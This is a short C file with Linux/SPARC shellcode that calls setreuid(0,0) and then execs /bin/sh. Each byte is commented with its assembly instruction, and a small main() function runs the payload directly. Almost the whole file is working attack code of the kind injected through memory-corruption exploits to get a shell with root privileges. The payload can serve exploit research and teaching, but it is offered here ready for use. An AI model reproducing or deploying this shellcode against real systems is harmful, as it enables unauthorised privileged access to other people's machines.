/*
 *  Linux/SPARC [setreuid(0,0); execve() of /bin/sh] shellcode.
 */

char c0de[] = /* anathema < anathema@hack.co.za > */
/* setreuid(0,0); */
"\x82\x10\x20\x7e"   /* mov 126, %g1               */
"\x92\x22\x40\x09"   /* sub %o1, %o1, %o1          */
"\x90\x0a\x40\x09"   /* and %o1, %o1, %o0          */
"\x91\xd0\x20\x10"   /* ta 0x10                    */

/* execve() of /bin/sh */
"\x2d\x0b\xd8\x9a"   /* sethi %hi(0x2f626800), %l6 */
"\xac\x15\xa1\x6e"   /* or %l6, 0x16e, %l6         */
"\x2f\x0b\xdc\xda"   /* sethi %hi(0x2f736800), %l7 */
"\x90\x0b\x80\x0e"   /* and %sp, %sp, %o0          */
"\x92\x03\xa0\x08"   /* add %sp, 0x08, %o1         */
"\x94\x22\x80\x0a"   /* sub %o2, %o2, %o2          */
"\x9c\x03\xa0\x10"   /* add %sp, 0x10, %sp         */
"\xec\x3b\xbf\xf0"   /* std %l6, [ %sp + - 16 ]    */
"\xd0\x23\xbf\xf8"   /* st %o0, [ %sp + - 8 ]      */
"\xc0\x23\xbf\xfc"   /* clr [ %sp + -4 ]           */
"\x82\x10\x20\x3b"   /* mov 0x3b, %g1              */
"\x91\xd0\x20\x10"   /* ta 0x10                    */
;

/*
 *  Test out the shellcode.
 */
main ()
{
    void (*sc)() = (void *)c0de;
    sc();
}

/* EOF */